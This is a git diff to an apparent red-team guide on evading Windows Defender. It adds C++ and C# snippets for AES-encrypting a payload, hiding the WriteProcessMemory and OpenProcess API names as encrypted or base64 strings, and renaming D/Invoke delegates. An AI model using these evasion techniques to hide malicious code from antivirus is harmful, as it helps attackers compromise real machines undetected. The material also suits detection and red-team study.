@@ -133,7 +133,7 @@ signtool sign /v /f SPC.pfx <executable>
 
 `Add AES paylod Encryption`
 
-First of all we need the function to apply AES encryption/decryption 
+First of all we need the c++ function to apply AES encryption/decryption 
 
 ```cpp
 //AES ENC
@@ -167,7 +167,17 @@ int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keyl
 }
 ```
 
-We then need to declare our encptyted WIN API function:
+We then need to declare our encptyted WIN API function as a pointers.
+
+```cpp
+  BOOL (WINAPI * pWriteProcessMemory)(
+  HANDLE  hProcess,
+  LPVOID  lpBaseAddress,
+  LPCVOID lpBuffer,
+  SIZE_T  nSize,
+  SIZE_T  *lpNumberOfBytesWritten
+);
+```
 
 ```cpp
 unsigned char sWriteProcessMemory[] = { 0xac, 0x40, 0xc4, 0xf9, 0x13, .... };
@@ -190,10 +200,9 @@ pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), sWriteProc
 ```
 
 
-In order to evade defender it is possible to change delegate names and implement base64 encoding of API strings
-
-
 #### 2) Change of delegate names
+
+In order to evade defender it is possible to change delegate names and implement base64 encoding of API strings
 
 Intended D/Invoke way:
 ```cpp
@@ -207,13 +216,13 @@ Obfuscated way:
 delegate IntPtr OpPr(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
 ```
 
-#### Change of API method pointer query
+#### 3) Change of API method pointer query:
 
 Intended D/Invoke way:
 ```cpp
 var pointer = Generic.GetLibraryAddress("kernel32.dll", "OpenProcess");
 ```
-Obfuscated way:
+Obfuscated base64 way:
 ```cpp
 string op = "T3BlblByb2Nlc3M="; // echo -n "OpenProcess" | base64
 byte[] openc = System.Convert.FromBase64String(op);
